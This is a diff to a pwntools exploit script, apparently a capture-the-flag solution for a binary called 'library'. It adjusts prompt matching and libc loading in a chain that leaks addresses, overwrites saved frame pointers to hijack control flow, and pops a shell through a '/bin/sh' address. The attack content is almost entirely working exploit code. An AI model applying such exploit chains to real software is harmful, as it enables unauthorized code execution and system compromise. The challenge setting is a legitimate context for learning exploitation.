@@ -1,7 +1,7 @@
 from pwn import*
 
 elf = context.binary = ELF('./library')
-libc = elf.libc
+libc = ELF('./libc.so.6')
 p = process()
 
 readBookSavedRIP = 0x18eb
@@ -23,7 +23,7 @@ def leak():
     p.sendline(b'2')
     p.recvuntil(b'\x1b[34m>\x1b[0m ')
     p.sendline(b'0')
-    p.recvuntil(b'\x1b[35mTitle: \x1b[0m')
+    p.recvuntil(b'\x1b[32mTitle: \x1b[0m')
     leak = p.recvline()
     leak = leak[:len(leak)-0x1]
     leak = leak.split(b',')
@@ -60,7 +60,7 @@ def write2menuSavedRBP(data):
     log.info('put the value: ' + hex(data) + ' in the memory location: ' + hex(savedRBP))
     p.recvuntil(b'\x1b[34m>\x1b[0m ')
     p.sendline(b'1')
-    p.recvuntil(b'\x1b[34m>\x1b[0m ')
+
 
 def prepareHijack():
     addressOfChoiceP1 = savedRBP-choice2rbp-0x8
@@ -69,6 +69,7 @@ def prepareHijack():
 prepareHijack()
 
 def hijack():
+    p.recvuntil(b'>\x1b[0m ')
     payload = bytes(str(elf.sym['book_keeper']), "utf-8")
     p.sendline(payload)
     log.info('sent hijack_payload')
@@ -76,7 +77,7 @@ def hijack():
 hijack()
 
 def popShell():
-    p.recvuntil(b'\x1b[34m>\x1b[0m ')
+    p.recvuntil(b'>\x1b[0m ')
     payload = bytes(hex(binsh), "utf-8")
     p.sendline(payload)
     log.success('popping a shell...')
@@ -85,4 +86,3 @@ def popShell():
 popShell()
 
 p.interactive()
-
